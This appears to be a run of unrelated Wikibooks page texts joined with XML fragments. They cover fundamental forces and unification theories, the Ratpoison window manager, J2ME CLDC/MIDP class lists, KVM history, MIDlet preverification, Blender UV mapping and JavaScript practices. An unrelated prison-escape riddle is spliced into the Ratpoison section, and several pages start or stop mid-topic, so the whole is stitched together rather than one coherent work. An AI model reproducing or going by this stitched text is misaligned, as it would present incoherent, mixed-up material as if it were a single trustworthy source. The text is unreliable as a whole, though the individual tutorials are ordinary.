elasticity). Of course, a real rubber cord would eventually break. This does not happen with the quark-quark force. It can grow to
infinity. This phenomenon is called the ''confinement of quarks''. 

Nonetheless, we are sure that the nucleon consists of three quarks having fractional charges. A hundred years ago Rutherford, by
observing the scattering of charged particles from an atom, proved that its positive charge is concentrated in a small nucleus.
Nowadays, similar experiments prove the existence of fractional point-like charges inside the nucleon.

The quark model actually is much more complicated than the quark-flow diagrams. It is a consistent mathematical theory that
explains a vast variety of experimental data. This is why nobody doubts that it reflects the reality.</text>

=Forces of Nature =

If asked how many types of forces exist, many people start counting on their fingers, and when the count exceeds ten, they answer
''plenty of''. Indeed, there are gravitational forces , electrical, magnetic, elastic, frictional forces, and also forces of wind, of
expanding steam, of contracting muscles, etc.

If, however, we analyze the root causes of all these forces, we can reduce their number to just a few fundamental forces (or ''fundamental interactions'', as physicists say).

For example, the elastic force of a stretched rubber cord is due to the attraction between the molecules that the rubber is made of.
Looking deeper, we find that the molecules attract each other because of the electromagnetic attraction between the electrons of
one molecule and nuclei of the other. Similarly, if we depress a piece of rubber, it resists because the molecules refuse to approach
each other too close due to the electric repulsion of the nuclei. Therefore the elasticity of rubber has the electromagnetic origin.

Any other force in the human world can be analyzed in the same manner. After doing this, we will find that all forces that we see
around us (in the macroworld), are either of gravitational or electromagnetic nature. As we also know, in the microworld there are
two other types of forces: The strong (nuclear) forces that act between all hadrons, and the weak forces that are responsible for
changing the quark flavors.

Therefore, all interactions in the Universe are governed by only four fundamental forces: Strong, electromagnetic, weak and
gravitational. These forces are very different in strength and range. Their relative strengths are given in Table 15.5. The most strong is the nuclear
interaction. The strength of the electromagnetic forces is one hundred times lower. The weak forces are nine orders of magnitude
weaker than the nuclear forces, and the gravity is 38 orders of magnitude weaker! It is amazing that this subtle interaction governs
the cosmic processes. The reason is that the gravitational forces are of long range and always attractive. There is no such thing as
negative mass that would screen the gravitational field, like negative electrons screen the field of positive nuclei.

==Towards the unified force ==

Physicists always try to simplify things. Since there are only four fundamental forces, it is tempting to ask &quot;If only four, then why
not only one?&quot;. Can it be that all interactions are just different faces of one master force?

The first who started the quest for unification of forces was Einstein. After completing his general theory of relativity, he
spent 30 years in unsuccessful attempts to unify the electromagnetic and gravity forces. At that time, it seemed logical because both of
them were infinite in range and obeyed the same inverse square law. Einstein failed because the unification should be done on the basis
of quantum laws, but he tried to do it using the classical concepts.

==Electro-weak unification ==

Now it is known that despite the similarities in form of the gravity and electromagnetic forces, the gravity will be the last to yield to
unification. The more implausible unification of the electromagnetic and weak forces turned out to be the first successful step towards the
unified interaction.

In 1979, the Nobel prize was awarded to Weinberg, Salam, and Glashow, who developed a unified theory of electromagnetic and weak
interactions. According to that theory, the electromagnetic and weak forces converge to one ''electro-weak'' interaction at very high
collision energies. The theory also predicted the existence of heavy particles, the &lt;math&gt;W&lt;/math&gt; and &lt;math&gt;Z&lt;/math&gt; (vector bosons), with masses around 80000MeV and 
90000MeV, respectively. These particles were discovered in 1983, which brought experimental verification to the new theory.

==Grand unification ==

The next step was to try to combine the electro-weak theory with the theory of the strong interactions (i.e. quark theory) in a single
theory. This work was called the ''grand unification''. Currently, physicists discuss versions of such theory that predicts the
convergence of the three forces at awfully high energies &lt;math&gt;\sim10^{17}&lt;/math&gt;MeV. The quarks and leptons in this theory, are the 
unified ''leptoquarks''.

The grand unification is not that successful as the electro-weak theory. It has the problem of mathematical consistency and
contradicts to at least one experiment. The matter is that it predicts the proton decay,

&lt;math&gt;p\,\longrightarrow\, e^+ +\pi^0\ &lt;/math&gt;,

that does not conserve both the baryon and lepton numbers, with the lifetime of &lt;math&gt;\sim10^{29}&lt;/math&gt;years. The measurements show, however, 
that the lifetime of the proton is at least &lt;math&gt;10^{32}&lt;/math&gt; years. 

==Theory Of Everything ==

Some people believe that the grand unification has an inherent principal flaw. According to them, one cannot unify the forces step
by step (leaving the gravity out), and the correct way is to combine all four forces in the so-called ''theory of everything''.

There are few different approaches to unifying everything. One of them suggests that all fundamental particles (quarks and leptons)
are just vibrating modes of string loops in multidimensional space. The electron is a string vibrating one way, the up-quark is a string
vibrating another way, and so on. The other approach introduces a new level of fundamental particles, the ''preons'', that could be
constituent parts of quarks and leptons. The quest goes on. 

Everyone agrees that constructing the theory of everything would in no way mean that biology, geology, chemistry, or even physics had
been solved. The universe is so rich and complex that the discovery of the fundamental theory would not mean the end of science. The
ultimate theory of everything would provide an unshakable pillar of coherence forever assuring us that the universe is a comprehensible place.</text>

      <text xml:space="preserve">Welcome to the '''Using Ratpoison Wikibook'''.

==Purpose==
This is intended to be a book aimed at the intermediate/advanced GNU/Linux user who wants to start using the Ratpoison Window manager. 

Thusly, only the window manager itself will be covered- this guide assumes that you have a working system running, from the kernel up to the X11 Windowing System, and it assumes you have competent grasp on Linux- this book will not teach you how to use GNU/Linux in general. Please see your distribution documentation or the [[Linux Guide]] to learn Linux in general.

==Who is this guide suitable for?==
Basically, any GNU/Linux or BSD user who wants to try something new or exciting, but also the user who wants to experiment with a different approach to mouse usage.

==What is ratpoison?==
Ratpoison is a window manager written for X Window, and principally developed by Linux users (though it should run on any operating system and platform [[Wikipedia:X Window|X Window]] does). It is very different from most other window managers in that it is a ''[[Wikipedia:Tiling window manager|tiling window manager]]'' and because it tries to minimize or completely eliminate the use of the mouse, in order to relieve stress on the arms and shoulders. 

In keeping with this old-school approach, ratpoison is also extremely lightweight, and there are no &quot;fat library dependencies&quot;, no fancy graphics beyond what other programs provide, and no window decoration. While this might seem odd at first, starting to use it is in fact quite simple. 
If you've ever used the [[Wikipedia:GNU Screen|GNU Screen]] terminal multiplexer or [[Wikipedia:GNU Emacs|GNU Emacs]], you'll be quite familiar with the interface, since most of the hotkeys and design ideas are borrowed from those programs. Indeed, the developers are very much fans of Emacs, as evidenced in one of the FAQs: 
:*''&quot;I want feature XYZ.&quot;''
:**''&quot;What you want is probably already in Emacs. If you don't use Emacs, start. If do use Emacs, use it more. If you *still* can't do what you want to do, you probably shouldn't do it.&quot;'' (sic)

===Pros===
#Ratpoison is extremely lightweight and will therefore start up and run very quickly; it will also run well on ancient hardware as well as more modern setups such as a 32-way SPARC.
#Rodent usage is minimized and the keyboard is promoted, relieving your arms and shoulders and decreasing the risk of injury
#Ratpoison works well with multiple monitors. &lt;!-- I wouldn't say *very* well- the site has to include a workaround a &quot;Dead space&quot; problem on two monitors so... --&gt;
#Ratpoison key-bindings are very similar to those of GNU Screen and should be familiar to users with experience using Screen.

===Cons===
#High learning curve. Not particularly suited for UNIX beginners, without a lot of customization- this is a window manager written by experts for experts, so to speak.
#Some programs like the GIMP (which uses a multitude of small windows) are simply not designed to work with tiling window managers and do not work very well.
#Java GUI applications have some issues with the way Ratpoison handles window parenting and most Java GUI applications will only render as a grey box. (This problem could be solved by issuing 'export AWT_TOOLKIT=MToolkit' command before starting Java app).

==Concepts==
To start with, ratpoison has some radically different concepts about using a computer. First, you cannot drag windows around the &quot;desktop&quot;, all windows are maximized to the full screen size and that cannot be changed. Because of this, you don't need window decorations, since they would steal precious space. When you look at a program, the only thing you see is the program. You are not forced to look at only one program at a time however: a window can be subdivided into a number of adjacent (but not overlapping!) frames; each of these frames holds a single program which is maximized within its frame. In Emacs terms, there is one window, split into one or more frames, in which each buffer is shown in one and only one frame.

A man is inside a prison cell. The cell is completely empty except for the man and a table. There are no doors or windows to escape from. There is also a desert surrounding the prison. At the edge of the desert is a town. The man escapes and traverses the desert to reach the town without walking over the desert. How?

      <text xml:space="preserve">==Introduction==
Many people confuse the role of CLDC in J2ME application development. It alone is not a framework for application development because you need more than a configuration to produce J2ME applications({{Web reference | title=J2ME | work=The J2ME Platform | URL=http://en.wikibooks.org/wiki/Programming:J2ME:The_J2ME_Platform}}).  You can think of CLDC as the spec that helps define the subset of the J2ME language items such as input/output, math, and etc that the Java Virtual Machine uses as its set of rules in actually runing MIDlets under the Mobile Information Device Profile(MIDP).

==Package Structure==
We can get a clearer picture of this by observing what each package in the CLDC defines as the J2ME java subset.  Although its not clear from the javadocs, Sun Microsystems does not separate MIDP and CLDC javadocs, these are the actual packages of CLDC({{Web reference | title=cldcapi | work=CLDC API Documentation, V1.0 | URL=http://java.sun.com/j2me/docs/pdf/cldcapi.pdf}}):

===CLDC1.0 list of Packages under java.*===
*java.lang.*
*java.io.*
*java.util.*

Thus, we have classes that deinfe the java language subset attributes used. How the java language susbet defintions for input/output are used. Also, a language definition of the subset of java.util.* from the full java language.

====Math Classes(CLDC1.0) in java.lang.* package from J2SE1.3====
*java.lang.Long
*java.lang.Short
*java.lang.Integer

Notice when compared to J2SE math we have no floating point(Float class) and no double(Double class).

====Utility Classes(CLDC1.0)  from J2SE1.3====
*java.lang.Math
*java.util.Random

====System Classes(CLDC1.0) in java.lang.* package from J2SE1.3====
*java.lang.System
*java.lang.Object
*java.lang.Runtime
*java.lang.Thread
*java.lang.Throwable
*java.lang.String
*java.lang.StringBuffer

====Data Type Classes(CLDC1.0) in java.lang.* package from J2SE1.3 excluding math====
*java.lang.Boolean
*java.lang.Byte
*java.lang.Character

====Collection Classes(CLDC1.0) in java.util.* package from J2SE1.3====
*java.util.Enumeration
*java.util.Hashtable(see note in conclusion, from jdk1.1.8 not jse1.3)
*java.util.Stack
*java.util.Vector(see note in conclusion, from jdk1.1.8 not jse1.3)

====Calendar and Time Classes(CLDC1.0) in java.util.* package from J2SE1.3====
*java.util.Calendar
*java.util.Date
*java.util.TimeZone

====IO Classes(CLDC1.1) excluding GCF in java.io.* package from J2SE1.3====
*java.io.Writer
*java.io.Reader
*java.io.ByteArrayInputStream
*java.io.ByteArrayOutputStream
*java.io.DataInputStream
*java.io.DataOutputStream
*java.io.InputStream
*java.io.OutputStream
*java.io.InputStreamWriter
*java.io.OuputStreamWriter
*java.io.PrintStream

====Exception Classes(CLDC1.0) in java.util.* package from J2SE1.3====
*java.util.EmptyStackException
*java.util.NoSuchElementException

====Exception Classes(CLDC1.0) in java.io.* package from J2SE1.3====
*java.io.EOFException
*java.io.IOException
*java.io.InterruptedException
*java.io.UnsupportedEncodingException
*java.io.UTFDataFormatException

====Error Classes(CLDC1.0) in java.lang.* package from J2SE1.3====
*java.lang.Error
*java.lang.VirtualMachineError
*java.lang.OutOfMemoryError



The other clases are mixed in with MIDP in the javadocs, thus I will list the full list of CLDC classes under the javax.microedition.io.* package.  The class is the capitalized name at the right sight of the dot ending the package.
{{subject|{{subject|J2ME_Programming/Connected_Limited_Device_Configuration}}}}

===CLDC1.0 list of classes under javax.microedition.io.*===
*javax.microedition.io.InputConnection
*javax.microedition.io.Connection
*javax.microedition.io.StreamConnection
*javax.microedition.io.OutputConnection
*javax.microedition.io.Datagram
*javax.microedition.io.DatagramConnection
*javax.microedition.io.StreamConnectionNotifier
*javax.microedition.io.ContentConnection
*javax.microedition.io.ConnectionNotFoundException
*javax.microedition.io.Connector


The common aspect that sets these classes apart is that they are interfaces defining the capabilities of the input/output connections.  The classes in java.io.* define the java language attributes that input/output classes in javax.microedition.io.* use as their rule set.

===CLDC1.1 additional classes===
*java.lang.Float
*java.lang.Double
*java.lang.Math

==GCF, General Connection Framework==
In the J2ME platform the J2SE IO is replaced with a smaller General Connection Framework(GCF). 

===javax.microedition.io GCF Classes from CLDC1.0===
*javax.microedition.io.InputConnection
*javax.microedition.io.Connection
*javax.microedition.io.StreamConnection
*javax.microedition.io.OutputConnection
*javax.microedition.io.DatagramConnection
*javax.microedition.io.StreamConnectionNotifier
*javax.microedition.io.ContentConnection
*javax.microedition.io.HttpConnection

==Conclusion==
In conclusion, under the subset of java language for CLDC we do not have floating point math, no double, no class loaders, no sockets and no serialization.  A smaller IO framework known as GCF is used.

While the javadocs read MID Profile in top right corner the actual Configuration or Profile they belong to is noted down before the class method summary is listed as:

&lt;i&gt;since CLDC1.0&lt;/i&gt; or &lt;i&gt;since MIDP1.0&lt;/i&gt;

Note, that not all classes are based on JDK1.3

===Classes(CLDC1.0) Based on JDK1.1.8 instead of JDK1.3===
*java.util.Vector
*java.util.Hashtable


These classes were based on JDK1.1.8 to conserve space.

===CLDC1.0 Limitations===
*Unicode Translation to and from reader/writer bytes is limited
*Does not support java.util.Properties from J2SE but limited stuff can be acquire as System.getProperty(String key) that starts with the keyword microedition

In case you're wondering, UV mapping stands for the technique used to &quot;wrap&quot; a 2D image texture onto a 3D mesh. &quot;U&quot; and &quot;V&quot; are the name of the axes of a plane, since &quot;X&quot;, &quot;Y&quot; and &quot;Z&quot; are used for the coordinates in the 3D space.  For example: increasing your &quot;V&quot; on a sphere might move you along a longitude line (north or south), while increasing your &quot;U&quot; might move you along a line of latitude (east or west).

Another explanation can be gleaned from the Blender manual. Imagine a paper 3D model of an object, e.g. a sphere, that is to be laid flat on a table. Each of the 3D coordinates of the sphere can be mapped to the 2D coordinate on the flat piece of paper. Blender provides another view of the vertices(coordinates) in the UV/Image Editor. You can select and edit these 2D vertices just like in the 3D Editor window. The purpose of this unwrapping of the coordinates is just to map these coordinates to images/pictures so that the 3D image can have a realistic looking surface with textures derived from these images.

==The Basics of UV Mapping==

=====Add a sphere=====
We'll use a sphere for this demonstration. Delete the initial cube (x). Then, create a new model, a sphere ('''{{B3D:N2P/Do|Shift+A}}''' → Add → Mesh → UV Sphere). Leave the settings at default for now.

[[Image:UV_sphere.png|300px]]

=====Mark a UV seam=====
In edit mode, select a ring of vertices around the widest part of the sphere (the equator, if you like). This can be done easily by holding down {{B3D:N2P/Do|Shift + Alt}} and right-clicking on the 'equator'.

Press {{B3D:N2P/Do|Ctrl+E}} and select ''Mark Seam'', or select ''Mesh'' → ''Edges'' → ''Mark Seam''. This tells the UV unwrapper to cut the mesh along these edges.

[[Image:Sphere_with_marked_seams.png|300px]]

=====Unwrap the mesh=====
Next, create a window for the UV mapping: click and drag left the small lined area in the top right corner of the 3D window, a new window will be created. Set its window type to &quot;UV/Image Editor&quot; with the drop down box at the bottom left corner of the new window or with {{B3D:N2P/Do|Shift+F10}}.

[[Image:Blender icosphere and UV Image Editor.png|600px]]

In the 3D View window, select all your vertices, and press ''U'' → ''Unwrap''. In the UV/Image editor you should see all the vertices/faces/edges of the model represented, or 'mapped', in 2D space.

[[Image:UV_unwrapped_sphere.png|400px]]

=====Apply an image=====
Now we're going to actually use this UV map. Save the following image(Click to view in full high resolution (4,096 × 2,048 pixels)):

[[Image:BlueMarble-2001-2002.jpg|500px]]

Load it in the UV/Image Editor window by clicking ''Image'' → ''Open Image'' or by pressing {{B3D:N2P/Do|Alt+O}}. Then with the grab, rotate and scale tools, adjust the UV islands (the UV groups that aren't connected to each other) so that it fits nicely on top of the image as shown. To select a UV island, hover the mouse over the island and press {{B3D:N2P/Do|L}}.

''Note: Since the aspect ratio of the image will warp the UV's, it may be easier to simply re-unwrap the mesh exactly the same way you did before. You can then adjust the UV's as needed.''

[[Image:Blender icosphere textured.png|600px]]

=====Admire your new creation=====
Back in the 3D View window, go into Object mode. The next drop-down menu to the right is the Draw Type menu; use it to set the Draw Type to Textured. Note that parts of the model will be shadowed and other parts illuminated based on the location of the lights in your scene. Try adding more lights and moving them around so you see the model more clearly, and try to use this lighting preview to 'previs' your render.

To make the texture visible in renderings, you also need to add the texture to the sphere as a new material. In the Properties window, switch to the Shading context by clicking the small shaded-sphere button. Create a new material by pressing the ''New'' button, leave the settings as they are for now; then switch to the Texture context. Create a new texture and select the type to be 'Image or Movie'. Select the globe texture from the dropdown menu.

[[Image:Texture_select.png]]

Then go to the mapping menu and set the Coordinates to 'UV' and the 'Map' to 'UVMap', leave the projection at 'Flat'. This will make use of the the UV's we unwrapped earlier.
To make the globe bit smoother, switch to the Modifier context in the Properties window and add a subsurf modifier; set the number of subdivisions to 2. Then press {{B3D:N2P/Do|T}} in the 3D viewport and select 'Smooth' under the shading options. This will make the globe far smoother and more realistic.

Now, simply press {{B3D:N2P/Do|F12}} to render your scene!

[[Image:Blender Blue Marble.jpg]]

Note that in the above render I've changed the lighting and the camera position to make the image more interesting. I also added a star background, you can find the settings for this the in the World context in the Properties window. Enable 'Stars', 'Paper Sky' and 'Blend Sky'. Play around with the settings for them until you reach a result you're pleased with.

==Alternative method==

If you looked around the textured globe we just made, you would have noticed that around the 'equator' there were lines, or 'seams', where the two UV islands met. This is a common problem with UV mapping and there are a couple of ways to avoid it. In our case, since we're using a sphere, the best way to remove the seams is to use spherical mapping.

First download one of the textures from this link: http://earthobservatory.nasa.gov/Features/BlueMarble/BlueMarble_monthlies.php. Then use this texture for your globe instead of the one we first downloaded.

Go into edit mode, and select all the vertices of sphere. Press {{B3D:N2P/Do|U}} → ''Sphere Projection''. If you've got the UV/Image editor open you should see a very different UV map, as shown below. Note that only the 'Unwrap' option will use the seams we just made, all of the other options completely ignore it.

[[Image:Sphere_projection.png|450px]]

Now lets make the UVs fit more evenly over the texture. In the UV/Image editor, press ''UVs'' → ''Constrain to Image Bounds''. This will make sure that during editing none of the UVs will go over the bounds of the texture; if they did, it would cause the texture to repeat itself in the area of the UVs outside the bounds.

Now select all the UVs with {{B3D:N2P/Do|A}} and scale them up till it is stopped by the image bounds. In my case, there is one vertice in the top-right corner, and a few in the bottom-right corner that is quite distant from the rest of the UVs; to fix this, I simply selected those vertices and moved them closer to the rest of the UVs.

[[Image:Sphere_UVs_edited.png|400px]]

Now simply scale all the UVs by the X axis until the UVs stretch over all of the image. Doing this is exactly the same as scaling in the 3D viewport, press {{B3D:N2P/Do|S}} and {{B3D:N2P/Do|X}}, then drag the mouse.

Now rerender your model, and you will see that there are no seams!

      <comment>/* RMS */</comment>
      <text xml:space="preserve">==Introduction==
While in [[Programming:J2ME:The_J2ME_Platform|The J2ME Platform]] we covered the whole J2ME platform, in this article we will be covering Mobile Information Device Profile 1.0(MIDP1.0).  While CLDC covers the subset of Java language used in MIDP devices, MIDP covers such areas as the graphical user interface and etc.

==Connection Protocols==
The CLDC defines the language definitions and operation of the input/output. However, the protocols that flow over this connection are defined by the Mobile Information Device Profile(MIDP).  In the MIDP1.0 the HTTP protocol is defined and used by the javax.microedition.io.HttpConnection class.

==MIDlet==
In MIDP application development the application container in which everything occurs is called the MIDlet.  The javax.microedition.midlet.* package set of classes define the MIDlet lifecycle and the MIDlet states.

===MIDlet classes===
*javax.microedition.midlet.MIDlet
*javax.microedition.midlet.MIDletStateChangeException

==RMS==
RMS, or Record Management Storage, is the persistent storage used in MIDP mobile devices.  While the RMS classes define how the RMS operates they do not define how much total kilobytes the RMS can take off the heap.  That information is usually found by either reading the OS datasheet when the OS includes their own JVM, such as SymbianOS, or from the JVM datasheet itself, or the device series datasheet.

===RMS classes===
*javax.microedition.rms.InvaidRecordIDException
*javax.microedition.rms.RecordComparator
*javax.microedition.rms.RecordEnumeration
*javax.microedition.rms.RecordFilter
*javax.microedition.rms.RecordListener
*javax.microedition.rms.RecordStore
*javax.microedition.rms.RecordStoreException
*javax.microedition.rms.RecordStoreFullException
*javax.microedition.rms.RecordStoreNotFoundException
*javax.microedition.rms.RecordStoreNotOpenException

==LCDUI, the MIDP GUI APIs==
In MIDP MIDlet development there are two APIs defined for the graphical user interface that are contained in the same '''Limited Connected Device User interface(LCDUI)''' packages. The low level API gives pixel control over placement of graphical items on the screen and is used heavily in games.  The high level interface has lightweight widgets to make business application gui building easier for developers.

===Displayable Object===
Both the High Level LCDUI API and the Low Level LCDUI API use the displayable object to send graphical data/objects to the screen to be displayed.

====Displayable Classes====
*javax.microedition.lcdui.Display
*javax.microedition.lcdui.Display

===High Level LCDUI API===
The High Level LCDUI API classes are:

====High Level LCDUI API Classes====
*javax.microedition.lcdui.Alert
*javax.microedition.lcdui.AlertType
*javax.microedition.lcdui.Choice
*javax.microedition.lcdui.ChoiceGroup
*javax.microedition.lcdui.Form
*javax.microedition.lcdui.Gauge
*javax.microedition.lcdui.ImageItem
*javax.microedition.lcdui.Item
*javax.microedition.lcdui.ItemStateListener
*javax.microedition.lcdui.List
*javax.microedition.lcdui.Screen
*javax.microedition.lcdui.StringItem
*javax.microedition.lcdui.TextBox
*javax.microedition.lcdui.TextField
*javax.microedition.lcdui.Ticker

====Screen====
At this point, we have to be careful as there are two Screens referred to in javadocs. We are referring to the both subclasses of Screen that are in the Displayable class.  Both encapsulate the High Level API. The first subclass of Screen under Displayable does not allow the removing of high level widgets once they are placed on screen such as List, TextBox, and Alert. The second subclass of Screen under Displayable allows one to place and remove widgets.

===Low Level LCDUI API===
An easy way to keep these two APIs clear in your mind is that High Level APIs are always have more classes than the Low Level APIs so that more complex graphical objects can be generated by just using a few methods.NKS

====Low Level LCDUI API Classes====
*javax.microedition.lcdui.Canvas
*javax.microedition.lcdui.Graphics
*javax.microedition.lcdui.Font
*javax.microedition.lcdui.Image

==Conclusion==
With these short concepts in mind you should be able to understand that the CLDC covers the [[w:java language|java language]] subset used in MIDlet development and the MIDP classes cover the user interface, connection protocols, and persistent storage.

      <text xml:space="preserve">==Introduction==
This article covers the evolution of [[w:Java Virtual Machine|java Virtual Machine]]s within the [[w:MIDP|MIDP]] family of devices for the J2ME Platform.  J2ME developers will find this information useful in determining whether their specific target devices support on device emulation and other beneficial information required for their application development on mobile devices.

==Brief History of Java Virtual Machines in MIDP devices==
In 1999 the K-Virtual Machine for CLDC/MIDP devices was introduced by [[w:Sun Microsystems|Sun Microsystems]].  Motorola demoed several different devices such as pagers running KVM at the 1999 JavaOne conference({{Web reference | title=Taking it to the Streets | work=Taking it to the Streets: Motorola and the K Machine | URL=http://java.sun.com/features/1999/06/moto.html}}).

As Sun Microsystems Engineers were tackling the problem of optimizing the Java Virtual Machine, they came up with the Java Platform Debugger Architecture({{Web reference | title=JPDA | work=Java Platform Debugger Architecture Home Page | URL=http://java.sun.com/products/jpda/}}) as a full debug infrastructure to assist java developers in debugging Java applications in a running mode operation using the JVM itself to provide the debugging functionality.

As mobile devices have a small memory size foot print, its obvious that the full JPDA could not be implemented in JVMs for mobile devices.  Thus, the lowest part of the JPDA, Java Debug Wire Protocol(JDWP), was implemented as KVM Debug Wire Protocol(KDWP) on the KVM.  Typically in the J2SE platform you would use an IDE to connect its JVM to the application JVM to collect this data that the JDWP sends from the application JVM.  In the mobile J2ME development environment you would use Sun's WTK on device debug implementation or an OEM Vendors emulator to serve in place of the IDE JVM collecting data from the mobile device KVM through the KDWP conduit.

A more full mobile JDPA was researched by faculty(Jim Vallino and Hans-Peter Bischof) of Rochester Institute of Technology  and students(Jon Coles, Zakir Mahomedy, Brian Koponen, Jeff Myers, John Mikucki, Aaron Deitrich)({{Web reference | title=KVMDB Project | work=Debugging Java Programs on the Palm Platform | URL=http://www.se.rit.edu/~jrv/research/KVMDB_Project.html}}) and this contributed to Sun Microsystems own KDPA product in 2001 for the KVM({{Web reference | title=Tasneem Sayeed-JavaOne Slides | work=Technical Overview of K Virtual Machine(KVM) with an in depth look at new features | URL=http://www.eos.dk/web/jaooslides/session_TasneemSayeed.pdf}}). 

With the release of J2SE 1.3.x, Sun Microsystems introduced the Java HotSpot Java Virtual Machine technology to the java developers community.  The introduction of HotSpot Optimized JVM technology to CLDC/MIDP devices(known as Monty) occurred in 2001({{Web reference | title=CLDC HI Whitepaper | work=CLDC HotSpot Implementation Virtual Machine | URL=http://java.sun.com/j2me/docs/pdf/CLDC-HI_whitepaper-February_2005.pdf}}).  The HotSpot Java Virtual Machine for CDC/J2ME Platform devices was introduced in 2004.

==K Virtual Machine==
KVM1.0 and onward are based on the Spotless non optimized JVM architecture ({{Web reference | title=Spotless | work=The Spotless System Homepage | URL=http://research.sun.com/spotless/}}).  All KVMs have the KVM Platform Debug Architecture and debugging is facilitated by a Debug Proxy within the Sun Microsystems WTK or vendor OEM emulator/simulator to connect the debug data and memory intensive debug operations up with occurring in the IDE JVM ({{Web reference | title=Tasneem Sayeed-JavaOne Slides | work=Technical Overview of K Virtual Machine(KVM) with an in depth look at new features | URL=http://www.eos.dk/web/jaooslides/session_TasneemSayeed.pdf}}).

Even with both those parts the KDWP portion on the mobile device has to be compiler turn-on enabled when the KVM for that device is first compiled and deployed to that device.  Some OEM vendors did not enable this feature due to memory/speed constraints faced in their own KVM implementation on their device series. Typically, KVM has a performance of 30% to 80% when compared to the JDK 1.1.x on the desktop.

===Basic KVM Features===
*30% to 80% of JDK 1.1.x desktop speed performance without Just-In-Time compiling technology
*Implemented in C
*Small memory foot print size of 60-72kb
*Platform independent Green Threads
*Ports to Linux, Windows, Solaris, and Windows CE
*Basic bytecode interpreter

==KVM Platform Debug Architecture==
*Based on existing JDWP (Java Debug Wire Protocol)
*Memory-intensive operations moved to Debug Agent (aka Debug Proxy) on Desktop Workstation
*KVM implements subset of JDPW command set (KDWP)

==CLDC HotSpot Implementation Virtual Machine==
The HotSpot term from both the mobile and the desktop implementations refers to the use of an adaptive compiler to only compile bytecode into native instructions for frequent used methods (hotspots). The infrequent methods are interpreted using an optimized interpreter. This improves performance over the KVM bytecode interpreter by a factor of 5 to 7 times.

Because over 90% of all MIDP devices use the ARM family of processors, the CLDC HotSpot VM Implementation uses three methods to optimize for the ARM processors known as Thumb Mode Support.  

===Thumb Mode Support===
*VM can be compiled into 16-bit Thumb machine code
*The dynamic adaptive compiler can be configured to generate 16-bit thumb machine code
*The optimized interpreter was implemented using the 32-bit ARM instruction set 
 
Another new feature when compared to the KVM is a multitasking option to run multiple threads and MIDLets in one JVM on mobile devices. These new multitasking features are implemented without relying on the underlying operating system.

This Virtual Machine implementation also implements the JDPA compliant technology first introduced in the KVM as KDWP. It is enabled by compiling the CLDC-HI VM and deploying it on a mobile device. Not every OEM vendor has made enough optimization of this CLDC-HI VM on their specific processor used and mobile hardware and thus some mobile devices with MIDP2.0 have this feature turned off.

      <comment>/* Preverification steps */</comment>
      <text xml:space="preserve">A '''[[w:MIDlet|MIDlet]]''' is a [[w:Java programming language|Java]] program for embedded devices, more specifically the [[w:J2ME|J2ME]] virtual machine. Generally, these are games and applications that run on a [[w:cell phone|cell phone]].

==Introduction==
Since class verification in [[w:J2SE|J2SE]] takes up 50&amp;nbsp;[[w:Kilobyte|KB]] and the lack of space in [[w:Mobile Information Device Profile|MIDP]] devices, the class verification has been broken up to a part that is completed by the developer and apart completed by the Mobile [[w:Java Virtual Machine|JVM]] itself. The developer-directed class verification stage is called MIDlet preverification, which occurs after the class is compiled.

==What Tasks Preverification Completes==
Generally, the preverification task annotates the class files with notes that the small incomplete class verifier in the Mobile VM reads and uses to do a fast class verification to enable the Mobile VM to then run the resulting bytecodes. The resulting [[w:Bytecode|bytecodes]] are valid bytecodes, because the annotations are using attributes of the bytecode to make the notes for the Mobile VM to read in doing its final incomplete class verification.&lt;ref&gt;{{Web reference | title=What is preverification? | work=What is preverification? Why do I receive error messages from the [[w:Connected Limited Device Configuration|CLDC]]/[[w:K virtual machine|KVM]] when I do not preverify my class files? | url=http://www.jguru.com/faq/view.jsp?EID=201507}}&lt;/ref&gt;. 

===JVM Class File Verification===
According to The Java Virtual Machine Specification,&lt;ref&gt;{{Web reference | title=VM Spec | work=The Java Virtual Machine Specification | url=http://java.sun.com/docs/books/vmspec/2nd-edition/html/VMSpecTOC.doc.html}} ISBN 0201432943&lt;/ref&gt; class file verification is completed in four passes before full startup of the JVM occurs in running bytecode of an application:

====Pass 1====
*Correct magic number in the first four bytes.
*Byte code attributes must be the proper length.
*The class file cannot be truncated or have extra bytes at end.
*Constant pool must not contain any superficial data.

====Pass 2====
*Ensures that final classes are not subclassed and that the final methods are not overridden.
*Checks that every class except &lt;code&gt;Object&lt;/code&gt; has a direct superclass.
*Ensures that the constant pool meets documented static constraints.
*Checks that all field references and method references in the constant pool have valid names, valid classes, and a valid type descriptor.

====Pass 3====
During linking, the verifier checks the code array of the code attribute by performing a data flow analysis to ensure these items are true:
*That the operand stack is always the same size and contains the same types of values.
*No local variable is accessed unless it is known to contain a value of an appropriate type.
*Methods are invoked with the appropriate arguments.
*Fields are assigned only using values of appropriate types.
*All [[wiktionary:opcode|opcodes]] have appropriate type arguments on the operand stack and in the local variable array.

====Pass 4====
This is the pass where class loading occurs to finalize the class verification process.

===Preverification steps===
*The preverification places a StackMap Attribute, which is a sub attribute of the Code attribute, which describes variable types used and operand stack items.
*Inlines all subroutines and removes jumps.&lt;ref&gt;({{Web reference | title=Ubiquitous Services | work=Ubiquitous Services Services on Mobile Devices | url=http://www.nm.ifi.lmu.de/Vorlesungen/ws0405/ubiserv/07-devices-10.01.05.pdf}}&lt;/ref&gt;
*By default, it generates a class file for the Java code.&lt;ref&gt;{{Web reference | title=J2ME Tutorial, Part 1: Creating MIDlets? | work=By default, the preverifier will create the preverified version of your class file in a folder called output in the current directory. It will preserve the package structure…. | url=http://today.java.net/pub/a/today/2005/02/09/j2me1.html?page=2#step4}}&lt;/ref&gt;

==Conclusion==
Preverification preverifies the compiled classes by inserting annotations in the StackMap portion of the Code attribute describing variable types used and operand stack items. This and inlining all subroutines and removing jumps reduces the first three passes of the J2SE verification process to something more manageable with the mobile device memory sizes in completing the last fourth pass on the mobile device within the mobile jvm.

      <text xml:space="preserve">[[Programming:JavaScript:Contents|Contents]]

This chapter will describe current Javascript community standards and best practices that every programmer should know.

== &lt;code&gt;document.write&lt;/code&gt; ==
This is deprecated. Use &lt;code&gt;innerHTML&lt;/code&gt; or DOM manipulation methods instead.

In XHTML, &lt;code&gt;document.write&lt;/code&gt; does not work, but you can achieve the same effects with DOM manipulation methods[http://w3.org/MarkUp/2004/xhtml-faq#docwrite].

==JavaScript protocol==

Try to avoid links that exist solely for executing JavaScript code.

 &lt;a href=&quot;javascript:resumeFancyVersion()&quot;&gt;See my résumé!&lt;/a&gt;

Instead consider:
  &lt;a href=&quot;resumePlainVersion.html&quot; onclick=&quot;return !resumeFancyVersion()&quot;&gt;See my résumé!&lt;/a&gt;

